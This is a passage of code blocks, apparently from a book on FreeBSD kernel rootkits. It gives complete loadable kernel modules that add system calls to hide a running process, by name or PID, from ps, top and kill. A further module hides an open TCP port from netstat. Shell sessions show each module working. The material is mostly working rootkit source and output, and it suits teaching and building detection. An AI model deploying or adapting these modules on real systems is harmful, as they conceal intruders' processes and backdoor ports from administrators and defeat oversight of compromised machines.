["```\n#define LIST_HEAD(name, type)                                           \\\nstruct name {                                                           \\\n        struct type *lh_first;  /* first element */                     \\\n}\n\n```", "```\nLIST_HEAD(HEADNAME, TYPE) head;\n\n```", "```\nstruct HEADNAME *headp;\n\n```", "```\n#define LIST_HEAD_INITIALIZER(head)                                     \\\n        { NULL }\n\n```", "```\n#define LIST_ENTRY(type)                                                \\\nstruct {                                                                \\\n        struct type *le_next;   /* next element */                      \\\n        struct type **le_prev;  /* address of previous element */       \\\n}\n\n```", "```\n#define LIST_FOREACH(var, head, field)                                  \\\n        for ((var) = LIST_FIRST((head));                                \\\n            (var);                                                      \\\n            (var) = LIST_NEXT((var), field))\n\n```", "```\n#define LIST_REMOVE(elm, field) do {                                    \\\n        if (LIST_NEXT((elm), field) != NULL)                            \\\n                LIST_NEXT((elm), field)->field.le_prev =             \\\n                    (elm)->field.le_prev;                            \\\n        *(elm)->field.le_prev = LIST_NEXT((elm), field);             \\\n} while (0)\n\n```", "```\n#include <sys/param.h>\n#include <sys/lock.h>\n#include <sys/mutex.h>\n\nvoid\nmtx_lock(struct mtx *mutex);\n\n```", "```\n#include <sys/param.h>\n#include <sys/lock.h>\n#include <sys/mutex.h>\n\nvoid\nmtx_unlock(struct mtx *mutex);\n\n```", "```\n#include <sys/param.h>\n#include <sys/lock.h>\n#include <sys/sx.h>\nvoid\nsx_slock(struct sx *sx);\n\nvoid\nsx_xlock(struct sx *sx);\n\n```", "```\n#include <sys/param.h>\n#include <sys/lock.h>\n#include <sys/sx.h>\n\nvoid\nsx_sunlock(struct sx *sx);\n\nvoid\nsx_xunlock(struct sx *sx);\n\n```", "```\n#define PROC_LOCK(p)    mtx_lock(&(p)->p_mtx)\n#define PROC_UNLOCK(p)  mtx_unlock(&(p)->p_mtx)\n\n```", "```\n#define MAXCOMLEN       19              /* max command name remembered */\n\n```", "```\nextern struct proclist allproc;         /* list of all processes */\n\n```", "```\nLIST_HEAD(proclist, proc);\n\n```", "```\nextern struct sx allproc_lock;\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/queue.h>\n#include <sys/lock.h>\n#include <sys/sx.h>\n#include <sys/mutex.h>\n\nstruct process_hiding_args {\n        char *p_comm;           /* process name */\n};\n\n/* System call to hide a running process. */\nstatic int\nprocess_hiding(struct thread *td, void *syscall_args)\n{\n        struct process_hiding_args *uap;\n        uap = (struct process_hiding_args *)syscall_args;\n\n        struct proc *p;\n\n        ❶sx_xlock(&allproc_lock);\n\n        /* Iterate through the allproc list. */\n        LIST_FOREACH(p, &allproc, p_list) {\n                 ❷PROC_LOCK(p);\n\n                 ❸if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {\n                               PROC_UNLOCK(p);\n                               continue;\n                }\n\n                /* Do we want to hide this process? */\n                ❹if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0)\n                               ❺LIST_REMOVE(p, p_list);\n\n                ❻PROC_UNLOCK(p);\n\n        }\n\n        ❼sx_xunlock(&allproc_lock);\n\n        return(0);\n\n}\n\n/* The sysent for the new system call. */\nstatic struct sysent process_hiding_sysent = {\n        1,                      /* number of arguments */\n        process_hiding          /* implementing function */\n};\n\n/* The offset in sysent[] where the system call is to be allocated. */\nstatic int offset = NO_SYSCALL;\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                uprintf(\"System call loaded at offset %d.\\n\", offset);\n                break;\n\n        case MOD_UNLOAD:\n                uprintf(\"System call unloaded from offset %d.\\n\", offset);\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n        }\n\n        return(error);\n\n}\n\nSYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);\n\n```", "```\n$ `sudo kldload ./process_hiding.ko`\nSystem call loaded at offset 210.\n$ `ps`\n  PID  TT  STAT      TIME COMMAND\n  530  v1  S      0:00.21 -bash (bash)\n  579  v1  R+     0:00.02 ps\n  502  v2  I      0:00.42 -bash (bash)\n  529  v2  S+     0:02.52 top\n$ `perl -e '$p_comm = \"top\";' -e 'syscall(210, $p_comm);'`\n$ `ps`\n  PID  TT  STAT      TIME COMMAND\n  530  v1  S      0:00.26 -bash (bash)\n  584  v1  R+     0:00.02 ps\n  502  v2  I      0:00.42 -bash (bash)\n\n```", "```\nlast pid:   582;  load averages:  0.00,  0.03,  0.04    up 0+00:19:08  03:46:\n❶20 processes:  1 running, 19 sleeping\nCPU states:  0.0% user,  0.0% nice,  0.3% system, 14.1% interrupt, 85.5% idle\nMem: 6932K Active, 10M Inact, 14M Wired, 28K Cache, 10M Buf, 463M Free\nSwap: 512M Total, 512M Free\n\n  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND\n  ❷529 ghost       1  96    0  2304K  1584K RUN      0:03  0.00% top\n  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash\n  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login\n  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login\n  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash\n  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd\n  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail\n  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron\n  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient\n  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd\n  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail\n\n. . .\n\nlast pid:   584;  load averages:  0.00,  0.03,  0.03    up 0+00:20:43  03:48:\n❸19 processes:  19 sleeping\nCPU states:  0.0% user,  0.0% nice,  0.7% system, 11.8% interrupt, 87.5% idle\nMem: 7068K Active, 11M Inact, 14M Wired, 36K Cache, 10M Buf, 462M Free\nSwap: 512M Total, 512M Free\n\n  PID USERNAME  THR PRI NICE   SIZE    RES STATE    TIME   WCPU COMMAND\n  502 ghost       1   8    0  3276K  2036K wait     0:00  0.00% bash\n  486 root        1   8    0  1616K  1280K wait     0:00  0.00% login\n  485 root        1   8    0  1616K  1316K wait     0:00  0.00% login\n  530 ghost       1   5    0  3276K  2164K ttyin    0:00  0.00% bash\n  297 root        1  96    0  1292K   868K select   0:00  0.00% syslogd\n  408 root        1  96    0  3412K  2656K select   0:00  0.00% sendmail\n  424 root        1   8    0  1312K  1032K nanslp   0:00  0.00% cron\n  490 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  489 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  484 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  487 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  488 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  491 root        1   5    0  1264K   928K ttyin    0:00  0.00% getty\n  197 root        1 110    0  1384K  1036K select   0:00  0.00% dhclient\n  527 root        1  96    0  1380K  1084K select   0:00  0.00% inetd\n  412 smmsp       1  20    0  3300K  2664K pause    0:00  0.00% sendmail\n  217 _dhcp       1  96    0  1384K  1084K select   0:00  0.00% dhclient\n\n```", "```\n$ `sudo kldload ./process_hiding.ko`\nSystem call loaded at offset 210.\n$ `ps`\n  PID  TT  STAT      TIME COMMAND\n  521  v1  S      0:00.19 -bash (bash)\n  524  v1  R+     0:00.03 ps\n  519  v2  I      0:00.17 -bash (bash)\n  520  v2  S+     0:00.25 top\n$ `perl -e '$p_comm = \"top\";' -e 'syscall(210, $p_comm);'`\n$ `ps -p 520`\n  PID  TT  STAT      TIME COMMAND\n  520  v2  S+     0:00.56 top\n\n```", "```\n#include <sys/malloc.h>\n#include <sys/systm.h>\n#include <sys/queue.h>\n\nvoid *\nhashinit(int nelements, struct malloc_type *type, u_long *hashmask);\n\n```", "```\nextern LIST_HEAD(pidhashhead, proc) *pidhashtbl;\n\n```", "```\npidhashtbl = hashinit(maxproc / 4, M_PROC, &pidhash);\n\n```", "```\nstruct proc *\npfind(pid)\n        register pid_t pid;\n{\n        register struct proc *p;\n\n        ❶sx_slock(&allproc_lock);\n        LIST_FOREACH(p, ❷PIDHASH(pid), p_hash)\n                if (p->p_pid == pid) {\n                        if (p->p_state == PRS_NEW) {\n                                p = NULL;\n                                break;\n                        }\n                        PROC_LOCK(p);\n                        break;\n                }\n        sx_sunlock(&allproc_lock);\n        return (p);\n}\n\n```", "```\n#define PIDHASH(pid)    (&pidhashtbl[(pid) & pidhash])\n\n```", "```\nstatic int\nprocess_hiding(struct thread *td, void *syscall_args)\n{\n        struct process_hiding_args *uap;\n        uap = (struct process_hiding_args *)syscall_args;\n\n        struct proc *p;\n\n        sx_xlock(&allproc_lock);\n\n        /* Iterate through the allproc list. */\n        LIST_FOREACH(p, &allproc, p_list) {\n                PROC_LOCK(p);\n\n                if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {\n                        PROC_UNLOCK(p);\n                        continue;\n                }\n\n                /* Do we want to hide this process? */\n                if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) `{`\n                        LIST_REMOVE(p, p_list);\n                        `LIST_REMOVE(p, p_hash);                 }`\n\n                PROC_UNLOCK(p);\n        }\n\n        sx_xunlock(&allproc_lock);\n\n        return(0);\n\n}\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/queue.h>\n#include <sys/lock.h>\n#include <sys/sx.h>\n#include <sys/mutex.h>\n\nstruct process_hiding_args {\n        pid_t p_pid;            /* process identifier */\n};\n\n/* System call to hide a running process. */\nstatic int\nprocess_hiding(struct thread *td, void *syscall_args)\n{\n        struct process_hiding_args *uap;\n        uap = (struct process_hiding_args *)syscall_args;\n\n        struct proc *p;\n\n        sx_xlock(&allproc_lock);\n\n        /* Iterate through pidhashtbl. */\n        LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash)\n\t\tif (p->p_pid == uap->p_pid) {\n                        if (p->p_state == PRS_NEW) {\n                                p = NULL;\n                                break;\n                        }\n                        PROC_LOCK(p);\n\n                        /* Hide this process. */\n                        LIST_REMOVE(p, p_list);\n                        LIST_REMOVE(p, p_hash);\n\n                        PROC_UNLOCK(p);\n\n                        break;\n                }\n\n        sx_xunlock(&allproc_lock);\n\n        return(0);\n}\n\n/* The sysent for the new system call. */\nstatic struct sysent process_hiding_sysent = {\n        1,                      /* number of arguments */\n        process_hiding          /* implementing function */\n};\n\n/* The offset in sysent[] where the system call is to be allocated. */\nstatic int offset = NO_SYSCALL;\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                uprintf(\"System call loaded at offset %d.\\n\", offset);\n                break;\n\n        case MOD_UNLOAD:\n                uprintf(\"System call unloaded from offset %d.\\n\", offset);\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n        }\n\n        return(error);\n\n}\n\nSYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);\n\n```", "```\n$ `sudo kldload ./process_hiding_redux.ko`\nSystem call loaded at offset 210.\n$ `ps`\n  PID  TT  STAT      TIME COMMAND\n  494  v1  S      0:00.21 -bash (bash)\n  502  v1  R+     0:00.02 ps\n  492  v2  I      0:00.17 -bash (bash)\n  493  v2  S+     0:00.23 top\n$ `perl -e 'syscall(210, 493);'`\n$ `ps`\n  PID  TT  STAT      TIME COMMAND\n  494  v1  S      0:00.25 -bash (bash)\n  504  v1  R+     0:00.02 ps\n  492  v2  I      0:00.17 -bash (bash)\n$ `ps -p 493`\n  PID  TT  STAT      TIME COMMAND\n$ `kill -9 493`\n-bash: kill: (493) - No such process\n\n```", "```\nstruct in_conninfo {\n        u_int8_t        inc_flags;\n        u_int8_t        inc_len;\n        u_int16_t       inc_pad;\n        /* protocol dependent part */\n        struct  in_endpoints inc_ie;\n};\n\n```", "```\nstruct in_endpoints {\n        u_int16_t       ie_fport;               /* foreign port */\n        u_int16_t       ie_lport;               /* local port */\n        /* protocol dependent part, local and foreign addr */\n        union {\n                /* foreign host table entry */\n                struct  in_addr_4in6 ie46_foreign;\n                struct  in6_addr ie6_foreign;\n        } ie_dependfaddr;\n        union {\n                /* local host table entry */\n                struct  in_addr_4in6 ie46_local;\n                struct  in6_addr ie6_local;\n        } ie_dependladdr;\n#define ie_faddr        ie_dependfaddr.ie46_foreign.ia46_addr4\n#define ie_laddr        ie_dependladdr.ie46_local.ia46_addr4\n#define ie6_faddr       ie_dependfaddr.ie6_foreign\n#define ie6_laddr       ie_dependladdr.ie6_local\n};\n\n```", "```\n#define INP_LOCK(inp)           mtx_lock(&(inp)->inp_mtx)\n#define INP_UNLOCK(inp)         mtx_unlock(&(inp)->inp_mtx)\n\n```", "```\nextern  struct inpcbinfo tcbinfo;\n\n```", "```\nLIST_HEAD(inpcbhead, inpcb);\n\n```", "```\n#define INP_INFO_WLOCK(ipi)     mtx_lock(&(ipi)->ipi_mtx)\n#define INP_INFO_WUNLOCK(ipi)   mtx_unlock(&(ipi)->ipi_mtx)\n\n```", "```\n#include <sys/types.h>\n#include <sys/param.h>\n#include <sys/proc.h>\n#include <sys/module.h>\n#include <sys/sysent.h>\n#include <sys/kernel.h>\n#include <sys/systm.h>\n#include <sys/queue.h>\n#include <sys/socket.h>\n\n#include <net/if.h>\n#include <netinet/in.h>\n#include <netinet/in_pcb.h>\n#include <netinet/ip_var.h>\n#include <netinet/tcp_var.h>\n\nstruct port_hiding_args {\n        u_int16_t lport;        /* local port */\n};\n\n/* System call to hide an open port. */\nstatic int\nport_hiding(struct thread *td, void *syscall_args)\n{\n        struct port_hiding_args *uap;\n        uap = (struct port_hiding_args *)syscall_args;\n\n        struct inpcb *inpb;\n\n        INP_INFO_WLOCK(&tcbinfo);\n\n        /* Iterate through the TCP-based inpcb list. */\n        LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {\n                ❶if (inpb->inp_vflag & INP_TIMEWAIT)\n                        continue;\n\n                INP_LOCK(inpb);\n\n                /* Do we want to hide this local open port? */\n                ❷if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))\n                        LIST_REMOVE(inpb, inp_list);\n\n                INP_UNLOCK(inpb);\n\n        }\n\n        INP_INFO_WUNLOCK(&tcbinfo);\n\n        return(0);\n\n}\n\n/* The sysent for the new system call. */\nstatic struct sysent port_hiding_sysent = {\n        1,                      /* number of arguments */\n        port_hiding             /* implementing function */\n};\n\n/* The offset in sysent[] where the system call is to be allocated. */\nstatic int offset = NO_SYSCALL;\n\n/* The function called at load/unload. */\nstatic int\nload(struct module *module, int cmd, void *arg)\n{\n        int error = 0;\n\n        switch (cmd) {\n        case MOD_LOAD:\n                uprintf(\"System call loaded at offset %d.\\n\", offset);\n                break;\n\n        case MOD_UNLOAD:\n                uprintf(\"System call unloaded from offset %d.\\n\", offset);\n                break;\n\n        default:\n                error = EOPNOTSUPP;\n                break;\n\n        }\n\n        return(error);\n\n}\n\nSYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, NULL);\n\n```", "```\n$ `telnet 192.168.123.107`\nTrying 192.168.123.107...\nConnected to 192.168.123.107.\nEscape character is '^]'.\nTrying SRA secure login:\nUser (ghost):\nPassword:\n[ SRA accepts you ]\n\nFreeBSD/i386 (alpha) (ttyp0)\n\nLast login: Mon Mar 5 09:55:50 on ttyv1\n\n$ `sudo kldload ./port_hiding.ko`\nSystem call loaded at offset 210.\n$ `netstat -anp tcp`\nActive Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address       (state)\ntcp4       0      0  192.168.123.107.23     192.168.123.153.61141 ESTABLISHED\ntcp4       0      0  *.23                   *.*                   LISTEN\ntcp4       0      0  127.0.0.1.25           *.*                   LISTEN\n$ `perl -e 'syscall(210, 23);'`\n$ `netstat -anp tcp`\nActive Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address       (state)\ntcp4       0      0  127.0.0.1.25           *.*                   LISTEN\n\n```", "```\n`$ cd /usr/src/sys`\n$ `grep -r \"LIST_HEAD(\" *`\n. . .\n$ `grep -r \"TAILQ _HEAD(\" *`\n. . .\n\n```"]